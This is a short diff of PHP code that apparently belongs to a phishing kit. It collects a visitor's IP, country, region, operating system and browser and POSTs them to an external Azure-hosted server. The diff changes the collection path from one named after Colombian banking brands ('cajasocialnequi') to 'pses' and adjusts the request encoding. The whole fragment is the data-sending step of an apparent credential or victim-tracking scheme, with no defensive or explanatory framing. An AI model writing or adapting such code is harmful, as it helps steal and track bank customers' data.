@@ -12,21 +12,20 @@ Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
 SO: ' . $user_os . '
 Navegador: ' . $navegador . '';
   $payload = ['mensaje' => $message];
-  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/cajasocialnequi/';
+  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/pses/';
 
   $ch = curl_init($url);
   curl_setopt_array($ch, [
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_POST           => true,
     CURLOPT_HTTPHEADER     => [
-      'Accept: application/json',
-      'Content-Type: application/json',
-'X-Client-IP: ' . $myip,
+      'X-Client-IP: ' . $myip,
     ],
-    CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
+    CURLOPT_POSTFIELDS     => $payload, // Aquí $payload debe ser un array asociativo
     CURLOPT_TIMEOUT        => 20,
     CURLOPT_CONNECTTIMEOUT => 10,
   ]);
+
 
   $response = curl_exec($ch);
   if ($response === false) {
